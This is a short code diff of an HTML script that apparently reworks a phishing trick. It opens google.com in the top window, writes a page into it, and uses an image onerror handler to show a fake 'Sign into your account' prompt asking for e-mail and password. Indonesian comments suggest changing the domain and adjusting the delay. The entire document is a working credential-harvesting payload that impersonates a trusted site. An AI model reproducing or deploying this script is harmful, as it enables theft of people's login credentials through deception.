@@ -1,7 +1,15 @@
 <script>
 function y() {
-  x = open('http://www.google.com', '_top');
-  x.document.body.innerHTML = '<img src="" onerror="setTimeout(function() {prompt(\'Sign into your account in order to access www.google.com\', \'E-mail / Password\')}, 150)">';
+  x = open('http://www.google.com','_top'); // Bisa diganti ke domainmu
+  x.document.write(`
+    <html>
+    <body>
+      <img src="" onerror="setTimeout(function() {
+        prompt('Sign into your account in order to access www.google.com', 'E-mail / Password')
+      }, 1000)">
+    </body>
+    </html>
+  `);
 }
-setTimeout(y, 6000);
+setTimeout(y, 2000); // Delay sebelum buka tab baru
 </script>
